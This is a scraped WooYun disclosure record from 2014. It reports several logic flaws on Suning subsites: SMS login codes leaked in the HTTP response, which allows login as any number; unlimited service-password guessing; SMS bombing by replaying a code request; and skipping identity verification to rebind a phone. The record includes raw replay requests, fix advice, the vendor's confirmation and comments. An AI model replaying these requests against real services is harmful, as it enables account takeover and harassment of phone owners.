{"id": 48678, "wybug_id": "wooyun-2014-082114", "wybug_title": "苏宁易购某网站全网号码存在任意登录、短信轰炸、绕过验证码的漏洞", "wybug_corp": "江苏苏宁易购电子商务有限公司", "wybug_author": "路人甲", "wybug_date": "2014-11-05 15:38", "wybug_open_date": "2014-12-20 15:40", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向公众公开  简要描述： 苏宁易购某网站全网号码存在任意登录、短信轰炸、绕过验证码的漏洞 详细说明：  正常登录易购，打开我的互联界面，选择登录模式为短信验证码，获取验证码。http://10035.suning.com/mysnnet/login.htm\n\n手机号码不是本人，点了验证码也没有用啊。没关系，我们重放一下发送验证码的post请求POST /myauth/checkMobile.htm HTTP/1.1Host: 10035.suning.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=utf-8X-Requested-With: XMLHttpRequestReferer: http://10035.suning.com/mysnnet/login.htmContent-Length: 21Cookie: WC_PERSISTENT=eRWA662%2bcQv%2bqzAZapSgr8SlGSc%3d%0a%3b2014%2d10%2d11+10%3a00%3a58%2e8%5f1267087194037%2d457%5f10052; _snma=1%7C141299281670776283%7C1412992816707%7C1413188136111%7C1413188142911%7C64%7C4; idsLoginUserIdLastTime=**********; WC_SERVER=6; totalProdQty=2; SN_CITY=100_100_1000173_9173_10001731_11365_2_0; cityId=9173; districtId=11365; _device_session_id=p_c7d*******32b06abc5e5; WC_SESSION_ESTABLISHED=true; WC_ACTIVEPOINTER=%2d7%2c10052; cartv20=6*****=******** custno=2201771585; WC_ML=L2; WC_RF=H; Login_UserName=+++++++g.com; _snmp=141318813764991770; _snmc=1; _snsr=direct%7Cdirect%7C%7C%7C; _snmb=141318143718696794%7C1413188142916%7C1413188142913%7C52; webcall_last_id=2201771585; nick=%E5%*******%BF%80%E6%B5%AA...; logonStatus=2; authId=si9462D4D359D152F4129CA6EC42274DE8; SN_CLIENT_ID=c347f1b18d614df1aa3f6c18477b3ef4; WC_USERACTIVITY_30000*******l%0ah3Dj5Lc2vnh33WrJoOE3zKQpMppCLQ%3d%3d; _snmz=141318814966888535%7C%28590%2C182%29Connection: keep-alivePragma: no-cacheCache-Control: no-cachenewMobile=1709258xxxx以下为重放post请求的具体截图，可以看见返回值里面的smcCode已经提前显示出来了，正常逻辑是显示在手机短信里面的。\n\n接下来就是遍历用户登录了，各种查询，业务办理\n\n另外再提一下，进入用户的界面后，服务密码修改这块，对原密码的输入错误次数没有任何限制，用被暴力破解的后果，\n\n另外1个漏洞，苏宁易购广告联盟验证当前用户身份存在绕过验证码策略，对手机进行短信轰炸。http://union.suning.com/aas/myinfo/network/my-info-manager!updatePromobile.action?step=1\n\n抓取验证身份-获取短信验证码数据包POST /aas/myinfo/network/my-info-manager!sendCode.action HTTP/1.1Host: union.suning.comUser-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://union.suning.com/aas/myinfo/network/my-info-manager!updatePromobile.action?step=1Content-Length: 28Cookie: WC_PERSISTENT=raODDuFWOIUODRfaWwog%2fxQ5QIM%3d%0a%3b2014%2d09%2d25+10%3a51%3a26%2e914%5f1267087194037%2d457%5f10052; proMobile=186XXXXXX&type=u通过HTTP协议重放攻击，设置proMobile手机号码字段值的范围，可遍历所有手机号码进行短信轰炸。\n\n\n\n\n\n绕过验证码\n\n\n\n正常页面处理逻辑为1，验证身份（输入验证码）-2、修改手机（输入验证码）-3、修改成功。再次修改手机时可以直接绕过验证身份（输入验证码）链接http://union.suning.com/aas/myinfo/network/my-info-manager!updatePromobile.action?step=1\n\n复制输入修改新手机186xxxx94xx（输入验证码）链接，即可直接修改新手机并绑定成功。http://union.suning.com/aas/myinfo/network/my-info-manager!updatePromobile.action?step=2\n\nhttp://union.suning.com/aas/myinfo/network/my-info-manager!updatePromobile.action?step=3\n\n   漏洞证明：  已经证明   修复方案：  1、不将短信验证码显示在http返回值里面2、服务密码这块加入输入错误次数的限制，防止暴力破解 3、加密，时间戳，每个包要有包序号，每次同向加1，收到重复序号认为是攻击，可以抵御重放攻击。4、验证更换手机密码步骤之间的关联和有效性。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-11-05 18:44 厂商回复： 感谢提交，漏洞确认，已经抄送给应用部门进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-05 16:02 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  e    \n     2014-11-05 16:06 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  还有这么牛的分站啊    \n     2014-11-05 16:23 |    \t\tYang \t\t\t( 普通白帽子  |\t\t\t        Rank:247 漏洞数:86        | 作为菜鸟，大米手机摔破了怎么办？)\t\t \n  看来苏宁提前双11了呀    \n     2014-11-06 10:09 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  @Yang 啥意思？    \n     2014-11-06 10:59 |    \t\tYang \t\t\t( 普通白帽子  |\t\t\t        Rank:247 漏洞数:86        | 作为菜鸟，大米手机摔破了怎么办？)\t\t \n  @ddy 提前给路人甲分发rank  好双11购物呗    \n     2014-12-22 11:04 |    \t\t小卖部部长 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:3        | 别拿部长不当干部！)\t\t \n  奔跑吧，兄弟~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}